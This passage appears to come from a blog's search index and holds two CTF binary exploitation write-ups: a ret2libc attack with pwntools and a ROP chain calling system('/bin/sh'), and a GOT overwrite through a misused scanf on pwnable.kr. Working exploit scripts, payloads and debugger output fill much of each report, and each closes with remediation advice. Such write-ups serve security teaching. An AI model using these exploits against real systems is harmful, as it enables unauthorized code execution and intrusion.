allocated to the your reassuring and comforting we will arrive safely in libc buffer  for the sake of shortening this name  this buffer is called input buffer throughout this report   After initializing input buffer  a series of three setbuf   calls are run  a function which controls the way a stream is buffered  Additionally  this function can control the size of the buffer  however due to the fact that the buffer argument is NULL  the stream is unbuffered  1    ftnt1Following the setbuf   calls is a succession of three puts   calls before the insecure gets   function is run with input buffer as the argument  After providing an input  the printf   function is called which prints out the address of printf in memoryBehaviorLooking at the security of the binary with the checksec command  it is found that the NX bit of the binary is enabledhighlight bash        0xd4y Writeup     business ctf redpwn pwn ret2the unknown       checksec ret2the unknown       home 0xd4y business ctf redpwn pwn ret2the unknown ret2the unknown    Arch      amd64 64 little   RELRO     Partial RELRO   Stack     No canary found   NX        NX enabled   PIE       No PIE  0x400000    endhighlightNote that this binary is 64 bit in little endiannessTherefore  the RIP cannot simply be overwritten to point to shellcode  However  the instruction pointer can easily be overwritten due to the lack of a stack canary  Furthermore  there is no PIE  Position Independent Executables  which means that the libc base can be calculated by finding the offset of the executables  this is examined in detail in the  Finding Base Libc Address   h 7rxf70l4dide  section   This element is essential to the success of return to libc attacksWhen executing the binary  user input can be provided after the  safely   stringhighlight bash    0xd4y Writeup     business ctf redpwn pwn ret2the unknown         ret2the unknownthat board meeting was a  smashing  success  rob loved the challenge in fact  he loved it so much he sponsored me a business trip to this place called  libc    where is this place  can you help me get there safely test stringphew  good to know  shoot  i forgot rob said i d need this to get there  7f8c6accfcf0good luck    endhighlightOnly after providing an input  the binary printed out the address of printf    However  this address changes with each new execution of the binaryhighlight bash        0xd4y Writeup     business ctf redpwn pwn ret2the unknown         ret2the unknownthat board meeting was a  smashing  success  rob loved the challenge in fact  he loved it so much he sponsored me a business trip to this place called  libc    where is this place  can you help me get there safely aphew  good to know  shoot  i forgot rob said i d need this to get there  7fd495f67cf0good luck    0xd4y Writeup     business ctf redpwn pwn ret2the unknown         ret2the unknownthat board meeting was a  smashing  success  rob loved the challenge in fact  he loved it so much he sponsored me a business trip to this place called  libc    where is this place  can you help me get there safely bphew  good to know  shoot  i forgot rob said i d need this to get there  7fb847d38cf0good luck    0xd4y Writeup     business ctf redpwn pwn ret2the unknown         ret2the unknownthat board meeting was a  smashing  success  rob loved the challenge in fact  he loved it so much he sponsored me a business trip to this place called  libc    where is this place  can you help me get there safely cphew  good to know  shoot  i forgot rob said i d need this to get there  7fac5a1c8cf0good luck    endhighlightThe printf   address is shown in redThis change is evidence of the existence of ASLR  address space layout randomization   which is a security feature to help prevent memory corruption vulnerabilities  Therefore  the base address of libc cannot be easily calculated by subtracting the address of printf in the previous execution of the binary by the printf symbol in the given libc fileExploit ConstructionGDBThus  to correctly calculate the libc base address  it is essential to overwrite RIP to point to main   so that the binary allows us to input a second payload  this time with the knowledge of the printf address   First  the offset of RIP must be calculatedhighlight bash    0xd4y Writeup     business ctf redpwn pwn ret2the unknown                                                                                                                                 gdb   ret2the unknown  qpwndbg  loaded 196 commands  Type pwndbg  filter  for a list pwndbg  created  rebase   ida gdb functions  can be used with print break Reading symbols from   ret2the unknown    No debugging symbols found in   ret2the unknown pwndbg  r     cyclic 100             Starting program   home 0xd4y business ctf redpwn pwn ret2the unknown ret2the unknown     cyclic 100 that board meeting was a  smashing  success  rob loved the challenge                           in fact  he loved it so much he sponsored me a business trip to this place called  libc      where is this place  can you help me get there safely                                     phew  good to know  shoot  i forgot                                                           rob said i d need this to get there  7ffff7e44cf0                                              good luckProgram received signal SIGSEGV  Segmentation fault                                                                                       DISASM                                              0x401237  main 177     ret     0x6161616c6161616b                                        STACK                                                00 0000  rsp 0x7fffffffde38      kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa    01 0008      0x7fffffffde40      maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa    02 0010      0x7fffffffde48      oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa    03 0018      0x7fffffffde50      qaaaraaasaaataaauaaavaaawaaaxaaayaaa    04 0020      0x7fffffffde58      saaataaauaaavaaawaaaxaaayaaa    05 0028      0x7fffffffde60      uaaavaaawaaaxaaayaaa    06 0030      0x7fffffffde68      waaaxaaayaaa    07 0038      0x7fffffffde70     0x61616179     yaaa                                            BACKTRACE                                                f 0         0x401237 main 177     f 1 0x6161616c6161616b     f 2 0x6161616e6161616d     f 3 0x616161706161616f     f 4 0x6161617261616171     f 5 0x6161617461616173     f 6 0x6161617661616175     f 7 0x6161617861616177  pwndbg  cyclic  l 0x6161616b40The program received a segmentation fault error  and the offset of RIP was calculated to be 40 bytes  Therefore  upon inputting 40 junk bytes followed by the address of the main function  the program will repeat  Using the info functions GDB command  the address of the main function can be found0x0000000000401186  main   endhighlightThe overall exploit can be summarized into two waves  wave one consists of repeating the main function and retrieving the printf address  and wave two consists of calling the libc system   function with  bin sh as the argumentPwnTools Rerunning main  Using pwntools  2    ftnt2   a python library made for facilitating the process of writing binary exploits  we can create a program  which was named poc py  to exploit the programhighlight python from pwn importREMOTE   Falseif REMOTE    p   remote  mc ax  31568 else    p   process    ret2the unknownrip offset   40main   0x0000000000401186payload   b A  40   p64 mainp recvuntil b safely   p sendline payload p interactive   endhighlightThe code shown above first starts a local process for the binary  Afterwards  the payload is sent and an interactive instance is called to the processhighlight bash    0xd4y Writeup     business ctf redpwn pwn ret2the unknown       python3 poc py    Starting local process    ret2the unknown   pid 5749    Switching to interactive modephew  good to know  shoot  i forgot rob said i d need this to get there  7f3f6e089cf0good luck that board meeting was a  smashing  success  rob loved the challenge in fact  he loved it so much he sponsored me a business trip to this place called  libc    where is this place  can you help me get there safely   testphew  good to know  shoot  i forgot rob said i d need this to get there  7f3f6e089cf0good luck     Got EOF while reading in interactive  thanks     Process    ret2the unknown  stopped with exit code  11  SIGSEGV   pid 5749     Got EOF while sending in interactiveTraceback  most recent call last   File   usr local lib python3 9 dist packages pwnlib tubes process py   line 787  in close   fd close  BrokenPipeError   Errno 32  Broken pipe   endhighlightThe main function was successfully called again  Now the printf function address can be retrieved to find the base libc address for the second wave of the exploit Finding Base Libc AddressWith the knowledge of where the printf function is in memory  the base address of libc can be calculated  and therefore the address of system   and location of the  bin sh string can be determined by adding their offsets to the base libc addresshighlight python from pwn importREMOTE   Falseif REMOTE    p   remote  mc ax  31568 else    p   process    ret2the unknownrip offset   40main   0x0000000000401186Wave 1Repeat main functionpayload   b A  40   p64 main p recvuntil b safely   p sendline payloadRetrieve printf addressp recvuntil b there    printf address   p recvuntil b luck    split b n   0  decodeWave 2Get base libc addresslibc   ELF  libc 2 28 so    checksec   False libc address   int printf address 16    libc symbols  printfGet system and bin sh addresses readysystem   libc symbols  system  bin sh   next libc search b  bin shlog success f libc base found at   hex libc address    log info f system at   hex system    log info f  bin sh at   hex bin sh    p interactive   endhighlightObserve the following addresses denoted in red when executing poc pyhighlight bash    0xd4y Writeup     business ctf redpwn pwn ret2the unknown       python3 poc py    Starting local process    ret2the unknown   pid 7483    libc base found at  0x7fe5b91a7790    system at  0x7fe5b91ec150     bin sh at  0x7fe5b9328ca9    Switching to interactive modethat board meeting was a  smashing  success  rob loved the challenge in fact  he loved it so much he sponsored me a business trip to this place called  libc    where is this place  can you help me get there safely   testphew  good to know  shoot  i forgot rob said i d need this to get there  7fe5b91ffcf0good luck     Got EOF while reading in interactive   endhighlightThe exact address of system   could be calculated due to the known offset of this function being 0x449c0  which is 0x7fe5b91ec150   0x7fe5b91a7790   Note that this works because PIE is disabled Building system   bin sh  After discovering the addresses of the system   function and  bin sh string  it follows that the system   bin sh   call must be built and executed using the aforementioned addresses  To do so  it is important to be able to control the RDI register which is used to pass parameters into functions  The RDI  RSI  RDX  and RCX registers are all used for that purpose  but they function via a hierarchical basis  in which the parameter passed into a function follows that particular order  3    ftnt3some function parameter1 parameter2 parameter3 parameter4parameter1 corresponds to RDI  parameter2 corresponds to RSI  and so onTherefore  to pass  bin sh to system    it is important to pop the RDI register and pass in the desired parameter value  Using the ROPgadget   binary ret2the unknown command  ROP gadgets that perform the desired pop operation can be found with their respective locations in memory0x00000000004012a3   pop rdi   retExploitUsing this gadget  the system   call will contain  bin sh as its argument  and a shell will be returnedhighlight python from pwn importREMOTE   Trueif REMOTE    p   remote  mc ax  31568 else    p   process    ret2the unknownrip offset   40main   0x0000000000401186   endhighlightWave 1highlight bash    Repeat main functionpayload   b A  40   p64 main p recvuntil b safely   p sendline payloadRetrieve printf addressp recvuntil b there    printf address   p recvuntil b luck    split b n   0  decodeWave 2Get base libc addresslibc   ELF  libc 2 28 so    checksec   Falseprint libc symbols  system   libc address   int printf address 16    libc symbols  printfGet system and bin sh address readysystem   libc symbols  system  bin sh   next libc search b  bin shlog success f libc base found at   hex libc address    log info f system at   hex system    log info f  bin sh at   hex bin shCreating the final payloadpop rdi   0x00000000004012a3payload   b A  40   p64 pop rdi    p64 bin sh    p64 systemp sendline payload p interactive   endhighlightRunning the exploit results in the successful return of a shellhighlight bash    0xd4y Writeup     business ctf redpwn pwn ret2the unknown       python3 poc py    Opening connection to mc ax on port 31568  Done281024    libc base found at  0x7ff17ea82000    system at  0x7ff17eac69c0     bin sh at  0x7ff17ec03519    Switching to interactive modethat board meeting was a  smashing  success  rob loved the challenge in fact  he loved it so much he sponsored me a business trip to this place called  libc    where is this place  can you help me get there safely phew  good to know  shoot  i forgot rob said i d need this to get there  7ff17eada560good luck   iduid 1000 gid 1000 groups 1000  lsflag txtrun  cat flag txtflag ro REDACTED sing    endhighlightConclusionThe insecure gets   function should never be used due to its lack of boundary checks on user input  This can result in the overwriting of memory that can lead to arbitrary code execution  ASLR and enabling the NX bit are not adequate in the prevention of binary exploitation  however they do help mitigate vulnerabilities   The following remediations should be strongly considered to prevent the attack outlined in this reportReplace the gets   function with fgets  The latter performs boundary checks on user input which mitigates buffer overflow attacksImplement PIEReturn to libc attacks worked by calculating the addresses of the system function and base libc address based on their known offersBy enabling PIE  the known offsets between executables cannot be predicted as they change with each new runtime processImplement  a stack canaryThe stack canary will mitigate buffer overflow attacks by protecting the return pointerPort 31568 should be closed immediately until the current binary is replaced with a more secure version that follows the aforementioned remediations1    ftnt ref1   https   www ibm com docs en i 7 3 topic functions setbuf control buffering  https   www google com url q https   www ibm com docs en i 7 3 topic 3Dfunctions setbuf control buffering sa D source editors ust 1653837169103275 usg AOvVaw0gnq0x2sYmgItPXYqLdZ j2    ftnt ref2   https   github com Gallopsled pwntools  https   www google com url q https   github com Gallopsled pwntools sa D source editors ust 1653837169103755 usg AOvVaw0Kk1kARNrnoqIMhktRkMJ3    ftnt ref3   https   trustfoundry net basic rop techniques and tricks   https   www google com url q https   trustfoundry net basic rop techniques and tricks  sa D source editors ust 1653837169104113 usg AOvVaw3IV qBJkKlJ5G0KY7fwYIq",
      "image": "/images/ret2theunknown.jpg"
    } ,
  
    {
      "title"    : "Passcode Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/07/15/Passcode-Writeup/",
      "date"     : "Jul 15, 2021",
      "content"  : "layout  posttitle  Passcode Writeupdescription  scanf   is a function that is widely used in C programs  This binary  which is seemingly secure  made subtle but dangerous programming mistakes that resulted in a security hole through which a user can manipulate memory  Since this binary is dynamically linked  overwriting the GOT entry subsequently forces the program to jump to memory of the attacker s choice when the manipulated function pointer gets called date    2021 07 15 image     images 0xd4y logo gray png tags     GOT  dynamic  Binary ExploitationThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Passcode 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedPasscodeUsing scanf   to Overwrite Memory    images 0xd4y logo gray png 0xd4yJuly 15  20210xd4y WriteupsLinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653864729105456 usg AOvVaw0vfjJU2CmbauaW q8UwfL8Email   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653864729106200 usg AOvVaw2tq2KTfBNW818Jkz7e9Wy2Table of ContentsExecutive Summary   h 2gk743bl4yws          2   h 2gk743bl4ywsAttack Narrative   h fghdla5fgquk          3   h fghdla5fgqukBinary Behavior   h s3etgisko63w          3   h s3etgisko63wSource Code   h 84ao9hlbfcj6          3   h 84ao9hlbfcj6Executing Binary   h x6k3hznu3try          5   h x6k3hznu3tryGDB   h lrrrvgvhfzfv          5   h lrrrvgvhfzfvExamining Segmentation Fault   h thgrlc2mq99l          5   h thgrlc2mq99lTaking Advantage of name 100    h 4ie0e0v86pcw          6   h 4ie0e0v86pcwExploit Construction   h pjx21gv1dgxw          8   h pjx21gv1dgxwWhere to Jump   h l8gxghna2ww3          8   h l8gxghna2ww3Which Function to Overwrite   h hnybt23f1cvz          9   h hnybt23f1cvzFinal Exploit   h 6lfgnluieal3          9   h 6lfgnluieal3Post Exploitation Analysis   h albxe7rgz1oc          11   h albxe7rgz1ocUnderstanding Dynamic Linking   h 34yunlt18c99          11   h 34yunlt18c99Examining the GOT Overwrite in GDB   h d4852d2vag07          12   h d4852d2vag07Conclusion   h 6065lc3vkrju          16   h 6065lc3vkrjuExecutive SummaryInsecure code in the passcode c file resulted in user control of memory that is meant to be inaccessible  The lack of boundary checks in the login   function coupled with the improper usage of the libc scanf   function  consequently lead to the execution of the  bin cat system command upon passing a carefully constructed malicious string  Specifically  the second parameter of scanf   was not an integer pointer value as it was not prepended with an ampersand  Taking advantage of insecure code and the fact that the binary in question is dynamically linked  an attacker is capable of overwriting the GOT entry of printf   or fflush   to jump to any place in the binary s memoryAttack NarrativeThe source code and compiled binary of the program were provided  Furthermore  the SSH credentials of the owner of this binary were givenUsernamePasswordPasscodeguestBinary BehaviorSource CodeBefore executing the binary  the program s behavior will first be analyzedhighlight c  include  stdio h  include  stdlib hvoid login          int passcode1        int passcode2        printf  enter passcode1             scanf   d   passcode1         fflush stdin            ha  mommy told me that 32bit is vulnerable to bruteforcing          printf  enter passcode2             scanf   d   passcode2         printf  checking   n          if passcode1  338150    passcode2  13371337                 printf  Login OK n                  system   bin cat flag                  else                printf  Login Failed n                  exit 0void welcome          char name 100         printf  enter you name             scanf   100s   name         printf  Welcome  s n   nameint main          printf  Toddler s Secure Login System 1 0 beta n   welcome        login             something after login          printf  Now I can safely trust you that you have credential   n          return 0   endhighlightThere are three user created functions in total  main    welcome    and login    The main   function  however  is not of interest as it only calls printf   and the welcome   and login   functions  Looking at welcome    a buffer name 100  is initialized with 100 bytes  Afterwards  the scanf   function is called with  100s as the first argument  up to 100 bytes of data are passed into the aforementioned buffer and subsequently printed out when passed into printf    this behavior is examined in the  Taking Advantage of name 100    h 4ie0e0v86pcw  section   After welcome   is called  the login   function is executedTwo variables are initialized  int passcode1 and int passcode2  Following the initialization of these variables  scanf   d   passcode1  is called  but the second argument is not an integer pointer  as it is not prepended with the ampersand symbol   Next  fflush stdin  is called as opposed to fflush stdout   Incidentally  usage of the former is not recommended as it can invoke strange behavior due to it being undefined  The call to fflush   is meant for output streams only in which the buffered data is outputted to the console  1    ftnt1   The scanf   function is then called again in which the second argument is not prepended with the ampersand symbol  Lastly  an if statement is run which is true when passcode1 is equal to 338150 and passcode2 is equal to 13371337  On the condition that this is true  the flag located on the target system is read outExecuting BinaryExecuting the binary with the input of 338150 for passcode1 and 13371337 for passcode2 results in a segmentation faulthighlight bash     0xd4y Writeup         other pwnable kr easy passcode       passcode                                                                                    Toddler s Secure Login System 1 0 beta enter you name   0xd4yWelcome 0xd4y enter passcode1   338150enter passcode2   13371337zsh  segmentation fault    passcode   endhighlightThis behavior can be further examined using GDB  a GNU project debugger useful for dynamic analysis  2    ftnt2GDBExamining Segmentation FaultRunning this binary in GDB  it can be seen that the program experiences a segmentation fault upon calling scanf   when moving EAX to EDXhighlight bash 0xf7e23250    vfscanf internal 14720     mov    dword ptr  edx   eaxLooking at the value for the EAX register reveals the input passed to the passcode2 variableeax            0xcc07c9            13371337   endhighlightTherefore  the input passed into the second parameter of the scanf   function has the ability to overwrite memoryTaking Advantage of name 100 Recall that welcome   only allocated 100 bytes to user input and implemented the scanf   function with the  s format specifier  The insecurity relating to this utilization of scanf   lies within the fact that it does not perform boundary checks on the user input  This unsafe practice results in a security hole in which user input can overflow the area in memory allocated for this buffer if the developer does not provide a safe value for the field width specifier  In the case of this binary  providing an input of larger than 100 bytes can result in the overflow of otherwise inaccessible memory located within login    This is because the field width specifier is 100   100s  and 100 bytes were allocated to the name buffer  Therefore  the trailing null byte will spill into memory located right after the buffer  To demonstrate this concept  observe the following1   First  the login   function is disassembled to find when the initial if statement occurshighlight bash pwndbg  disass loginDump of assembler code for function login   0x08048564   0       push   ebp  0x08048565   1       mov    ebp esp  0x08048567   3       sub    esp 0x28  0x0804856a   6       mov    eax 0x8048770  0x0804856f   11      mov    DWORD PTR  esp  eax  0x08048572   14      call   0x8048420  printf plt   0x08048577   19      mov    eax 0x8048783  0x0804857c   24      mov    edx DWORD PTR  ebp 0x10   0x0804857f   27      mov    DWORD PTR  esp 0x4  edx  0x08048583   31      mov    DWORD PTR  esp  eax  0x08048586   34      call   0x80484a0    isoc99 scanf plt   0x0804858b   39      mov    eax ds 0x804a02c  0x08048590   44      mov    DWORD PTR  esp  eax  0x08048593   47      call   0x8048430  fflush plt   0x08048598   52      mov    eax 0x8048786  0x0804859d   57      mov    DWORD PTR  esp  eax  0x080485a0   60      call   0x8048420  printf plt   0x080485a5   65      mov    eax 0x8048783  0x080485aa   70      mov    edx DWORD PTR  ebp 0xc   0x080485ad   73      mov    DWORD PTR  esp 0x4  edx  0x080485b1   77      mov    DWORD PTR  esp  eax  0x080485b4   80      call   0x80484a0    isoc99 scanf plt   0x080485b9   85      mov    DWORD PTR  esp  0x8048799  0x080485c0   92      call   0x8048450  puts plt   0x080485c5   97      cmp    DWORD PTR  ebp 0x10  0x528e6  0x080485cc   104     jne    0x80485f1  login 141   0x080485ce   106     cmp    DWORD PTR  ebp 0xc  0xcc07c9  0x080485d5   113     jne    0x80485f1  login 141   0x080485d7   115     mov    DWORD PTR  esp  0x80487a5  0x080485de   122     call   0x8048450  puts plt   0x080485e3   127     mov    DWORD PTR  esp  0x80487af  0x080485ea   134     call   0x8048460  system plt   0x080485ef   139     leave   0x080485f0   140     ret     0x080485f1   141     mov    DWORD PTR  esp  0x80487bd  0x080485f8   148     call   0x8048450  puts plt   0x080485fd   153     mov    DWORD PTR  esp  0x0  0x08048604   160     call   0x8048480  exit plt    endhighlightNote the line highlighted in red which signifies the beginning of the if statement  The hex value 0x528e6  338150 in decimal  is compared to ebp 0x10  thus at this point in memory lies passcode1   By the same token  the line highlighted in purple represents passcode2 in which 0xcc07c9  13371337 in decimal  is compared to ebp 0xc2   After setting a breakpoint at login 97  0x080485c5   the program is run with a username of 101 A shighlight bash pwndbg  b  login 97Breakpoint 1 at 0x80485c5pwndbg  rStarting program   home 0xd4y business other pwnable kr easy passcode passcodeToddler s Secure Login System 1 0 beta enter you name   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWelcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA enter passcode1   enter passcode2   checking    endhighlight3   Now looking at the value located at ebp 0x10 shows something of interesthighlight bash pwndbg  x x  ebp 0x100xffffd008      0x41414141   endhighlight41 in hex is  A   Therefore  upon passing a large input to the name 100  buffer  the value for passcode1 can be written into  Additionally  observe the value for passcode2 located at ebp 0xchighlight bash pwndbg  x x  ebp 0xc0xffffd00c      0x2b959b00   endhighlightThe null byte  a byte which is automatically appended to the end of a string to signify its end  leaks into passcode2 as can be seen from the trailing 0 s  Moreover  note how although 101 A s were passed  the last trailing A did not flood into the value for passcode2 because of the field width specification  namely  100s  in the scanf   100s   passcode1  callExploit ConstructionWhere to JumpDue to the unstable nature of this binary  passing in 338150 as passcode1 and 13371337 as passcode2 does not result in the expected execution of  bin cat  rather a segmentation fault occurs  see  Examining Segmentation Fault   h thgrlc2mq99l    Therefore  in order to execute  bin cat  it is essential that the program is manipulated to point to an address after the if statement and before the call to the system command  Looking at the disassembly of the login   function  this leaves the following addresses  0x080485d7  0x080485de  and 0x080485e3  For the purposes of this report  the 0x080485d7 address is used which is 134514135 in decimalWhich Function to OverwriteWith the established notion that one of the aforementioned values is necessary for the desired jump to the system call  the next question is  Which memory address should be overwritten with the desired value    Ideally  the memory of a used function can be overwritten so as to point to one of the desired valuesUsing the readelf  a passcode command  the file header  sections  and symbols  along with a lot of other information  can be seen  This facilitates the process of finding where functions are mapped onto memoryhighlight bash Relocation section   rel plt  at offset 0x398 contains 9 entries                                         Offset     Info    Type            Sym Value  Sym  Name0804a000  00000107 R 386 JUMP SLOT   00000000   printf GLIBC 2 0                                        0804a004  00000207 R 386 JUMP SLOT   00000000   fflush GLIBC 2 00804a008  00000307 R 386 JUMP SLOT   00000000     stack chk fail GLIBC 2 40804a00c  00000407 R 386 JUMP SLOT   00000000   puts GLIBC 2 00804a010  00000507 R 386 JUMP SLOT   00000000   system GLIBC 2 00804a014  00000607 R 386 JUMP SLOT   00000000     gmon start    0804a018  00000707 R 386 JUMP SLOT   00000000   exit GLIBC 2 0  0804a01c  00000807 R 386 JUMP SLOT   00000000     libc start main GLIBC 2 00804a020  00000907 R 386 JUMP SLOT   00000000     isoc99 scanf GLIBC 2 7   endhighlightThere are nine functions in total that readelf found  However  looking at the  Source Code   h 84ao9hlbfcj6   only two functions are used before the system call and after scanf    printf   and fflush    Either function will work for this exploit  however in this report the printf   function is utilized  Due to this binary being in little endian format  printf   in bytes is x00xa0x04x08Final ExploitPiecing the information found in  Where to Jump   h l8gxghna2ww3  and  Which Function to Overwrite   h hnybt23f1cvz  together  the final exploit can be constructedPseudo Exploit  JUNK BYTE   96   FUNCTION TO OVERWRITE   WHERE TO JUMPExploit  python  c  print  A  96    x00xa0x04x08     134514135highlight bash passcode pwnable    python  c  print  A  96    x00xa0x04x08     134514135      passcodeToddler s Secure Login System 1 0 beta enter you name   Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA enter passcode1   Login OK Sor REDACTED  out scanf usage   Now I can safely trust you that you have credential    endhighlightPost Exploitation AnalysisThe binary exploited in this report was unstripped and dynamically linkedhighlight bash     0xd4y Writeup         other pwnable kr easy passcode     file passcodepasscode  ELF 32 bit LSB executable  Intel 80386  version 1  SYSV   dynamically linked  interpreter  lib ld linux so 2  for GNU Linux 2 6 24  BuildID sha1  d2b7bd64f70e46b1b0eb7036b35b24a651c3666b  not stripped   endhighlightThe fact that it was dynamically linked played an essential role in making the exploit succeed  To understand exactly how it worked  it is important to realize what dynamic linking is and how it operatesUnderstanding Dynamic LinkingWhen a binary is dynamically linked  the libc calls within the program do not point to any meaningful addresses  Take the following snippet from passcode for examplehighlight bash 0x08048593   47      call   0x8048430  fflush plt 0x08048598   52      mov    eax 0x80487860x0804859d   57      mov    DWORD PTR  esp  eax0x080485a0   60      call   0x8048420  printf plt    endhighlightNote the text highlighted in red  The program calls fflush   and printf   which are at 0x8048430 and 0x8048420 respectively  Since this binary is dynamically linked  before the binary is ever run  fflush   and printf    and any other libc function for that matter  refer to placeholder addresses such as 0x00000000  However  once the program is loaded  these addresses are resolved using the help of the Global Offset Table  GOT  and Procedure Linkage Table  PLT   a table which converts position independent function calls to absolute locations  3    ftnt3   When a libc function is called  the first thing the PLT does is jump to the GOT  Global Offset Table  entry of the called function  The GOT maps symbols  such as printf    to their actual location  4    ftnt4   Thus  when the exploit was passed into the binary  the GOT entry which maps printf   to its actual location was overwritten to instead point to 0x080485d7Examining the GOT Overwrite in GDBThe way the binary handles the malicious input can be examined more in detail within GDB  After disassembling the login   function  it can be seen that the printf   call that occurs after scanf   is at login 60  or 0x080485a0highlight bash 0x080485a0   60      call   0x8048420  printf plt    endhighlightAfter setting a breakpoint at this function and passing in the exploit  the breakpoint gets hithighlight bash pwndbg  b  login 60                  Breakpoint 1 at 0x80485a0              pwndbg  r     python  c  print  A  96  x00xa0x04x08   134514135   Starting program   home 0xd4y business other pwnable kr easy passcode passcode     python  c  print  A  96  x00xa0x04x08   134514135   Toddler s Secure Login System 1 0 beta                                                                   enter you name   Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABreakpoint 1  0x080485a0 in login                                                                       LEGEND  STACK   HEAP   CODE   DATA   RWX   RODATA                                                                                                     REGISTERS                                                                                                     EAX  0x8048786     outsb  dx  byte ptr gs  esi      enter passcode2       EBX  0x0                                          ECX  0x0                                                                                                EDX  0xffffffff                                    EDI  0xf7faf000   GLOBAL OFFSET TABLE       0x1e4d6cESI  0xf7faf000   GLOBAL OFFSET TABLE       0x1e4d6c                                                    EBP  0xffffd038     0xffffd058     0x0      ESP  0xffffd010     0x8048786     outsb  dx  byte ptr gs  esi      enter passcode2       EIP  0x80485a0  login 60      0xfffe7be8     0x0                                                                                                           DISASM                                                    0x80485a0  login 60      call   printf plt  printf plt    endhighlightIt was established that this exploit works  Therefore  somewhere within memory the address 0x80485d7 is loaded up  To find its exact location  the info proc mappings and find command within GDB can be utilizedhighlight bash pwndbg  info proc mappingsprocess 1961Mapped address spaces        Start Addr   End Addr       Size     Offset objfile        0x8048000  0x8049000     0x1000        0x0  home 0xd4y business other pwnable kr easy passcode passcode        0x8049000  0x804a000     0x1000        0x0  home 0xd4y business other pwnable kr easy passcode passcode        0x804a000  0x804b000     0x1000     0x1000  home 0xd4y business other pwnable kr easy passcode passcode        0x804b000  0x806d000    0x22000        0x0  heap        0xf7dca000 0xf7de7000    0x1d000        0x0  usr lib i386 linux gnu libc 2 31 so       0xf7de7000 0xf7f3c000   0x155000    0x1d000  usr lib i386 linux gnu libc 2 31 so       0xf7f3c000 0xf7fac000    0x70000   0x172000  usr lib i386 linux gnu libc 2 31 so       0xf7fac000 0xf7fad000     0x1000   0x1e2000  usr lib i386 linux gnu libc 2 31 so       0xf7fad000 0xf7faf000     0x2000   0x1e2000  usr lib i386 linux gnu libc 2 31 so       0xf7faf000 0xf7fb1000     0x2000   0x1e4000  usr lib i386 linux gnu libc 2 31 so       0xf7fb1000 0xf7fb3000     0x2000        0x0       0xf7fca000 0xf7fcc000     0x2000        0x0       0xf7fcc000 0xf7fd0000     0x4000        0x0  vvar        0xf7fd0000 0xf7fd2000     0x2000        0x0  vdso        0xf7fd2000 0xf7fd3000     0x1000        0x0  usr lib i386 linux gnu ld 2 31 so       0xf7fd3000 0xf7ff0000    0x1d000     0x1000  usr lib i386 linux gnu ld 2 31 so       0xf7ff0000 0xf7ffb000     0xb000    0x1e000  usr lib i386 linux gnu ld 2 31 so       0xf7ffc000 0xf7ffd000     0x1000    0x29000  usr lib i386 linux gnu ld 2 31 so       0xf7ffd000 0xf7ffe000     0x1000    0x2a000  usr lib i386 linux gnu ld 2 31 so       0xfffdd000 0xffffe000    0x21000        0x0  stack    endhighlightRecall that 134514135 is 0x080485d7 in hex and it points to the location between the if statement and system callhighlight bash pwndbg  p x 134514135 1   0x80485d7pwndbg  find 0x8048000 0x806d000 0x80485d70x804a000  printf got plt warning  Unable to access 15357 bytes of target memory at 0x8069404  halting search 1 pattern found pwndbg  x x 0x804a0000x804a000  printf got plt       0x080485d7   endhighlightNote that the find command has the syntax find  start address   end address   what to look forThe pointer for printf   was successfully overwritten to 0x08045d7  Observe that this is different from the printf pointer before the exploithighlight bash pwndbg  x x 0x804a0000x804a000  printf got plt       0x08048426   endhighlightWhen stepping one instruction  it is expected that from the printf   call  the program will look at the GOT entry of printf    The program will then be tricked to believe that the code for printf   can be found at 0x08045d7  and the EIP will therefore point to 0x08045d7highlight bash    0x080485a0   60      call   0x8048420  printf pltpwndbg  x x  eip0x80485a0  login 60     0xfffe7be8pwndbg  s0x080485d7 in login   LEGEND  STACK   HEAP   CODE   DATA   RWX   RODATA                                                REGISTERS                                                EAX  0x8048786     outsb  dx  byte ptr gs  esi      enter passcode2       EBX  0x0ECX  0x0EDX  0xffffffffEDI  0xf7faf000   GLOBAL OFFSET TABLE       0x1e4d6cESI  0xf7faf000   GLOBAL OFFSET TABLE       0x1e4d6cEBP  0xffffd038     0xffffd058     0x0 ESP  0xffffd00c     0x80485a5  login 65      mov    eax  0x8048783 EIP  0x80485d7  login 115      mov    dword ptr  esp   0x80487a5                                                 DISASM                                                    0x80485d7  login 115     mov    dword ptr  esp   0x80487a5  0x80485de  login 122     call   puts plt  puts plt0x80485e3  login 127     mov    dword ptr  esp   0x80487af  0x80485ea  login 134     call   system plt  system plt    endhighlightObserve the instruction pointer  EIP  which jumped to the location between the if statement and system callConclusionThe binary was successfully exploited which resulted in the leakage of otherwise inaccessible data  Compiler warnings should never be ignored  Unsafe practices involving user input can lead to security holes  The scanf   function was improperly used  and is not recommended when dealing with strings  unless the developer is careful of the field width specifier and allocated buffer size   Furthermore  the second argument of scanf   was not prepended with the ampersand symbol  which allowed for the passing of an address causing the overwrite of printf    The following remediations should be strongly consideredPrepend scanf   with the amerpand symbol    Failure to do so allowed for the direct passing of an addressWhen dealing with strings  allocate at most a field width that is one less than the bufferDue to name 100  having 100 bytes  the scanf   field width specifier should be 99 instead of 100 to take into account the null byteUse sscanf   in conjunction with getline   when dealing with user inputted stringsgetline   automatically allocates an appropriate buffer size to safely fit the input string  5    ftnt5 